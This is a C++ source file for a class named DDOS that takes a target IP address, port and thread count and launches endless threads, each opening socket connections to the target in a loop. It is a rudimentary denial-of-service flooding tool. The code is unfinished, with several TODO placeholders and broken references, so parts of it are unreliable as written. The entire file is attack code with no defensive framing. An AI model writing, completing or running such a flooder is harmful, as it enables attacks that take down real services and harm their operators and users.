#include "../include/DDOS.hh"

DDOS::DDOS(char *target, MAX_SUPER_INT frequency, MIN_SUPER_INT port, bool protocol): target(target), protocol(protocol), port(port), frequency(frequency) {}

bool DDOS::isIPv4() {
  regex IPv4("([0-9]{1,3}.){3}\\.([0-9]{1,3})");
  return (regex_match(this->target, IPv4)) ? true : false;
}

MIN_SUPER_INT DDOS::getPort() {
  return this->port;
}

MAX_SUPER_INT DDOS::getFrequency() {
  return this->frequency;
}

bool DDOS::getProtocol() {
  // TODO:
  // Check if protocol is valid !
  return this->protocol;
}

void* DDOS::goSocket(void *) {
  while (true) {
    SOCKADDR_IN sin;
    SOCKET sock = socket(AF_INET, object.protocol, 0);
    // TODO: Check socket && return error bootstrap.
    sin.sin_addr.s_addr = inet_addr(object.target);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(object.port);
    connect(sock, (SOCKADDR*)&sin, sizeof(sin));
    // TODO: Check connect && return error bootstrap..
  }

  pthread_exit(NULL);
}

void DDOS::attack() {
  if(!this->isIPv4()) {
    // TODO: Return error bootstrap.
  }
  while (true) {
    pthread_t threads[this->frequency];
    for(int i = 0; i < this->frequency; i++)
      int currentThreads = pthread_create(&threads[i], NULL, &DDOS::goSocket, this);
  }
}

/*void DDOS::stop(vector<std::thread> threads) {

}*/

DDOS::~DDOS() {
  // TODO:
  // Destroy threads if frequency > 1.
}
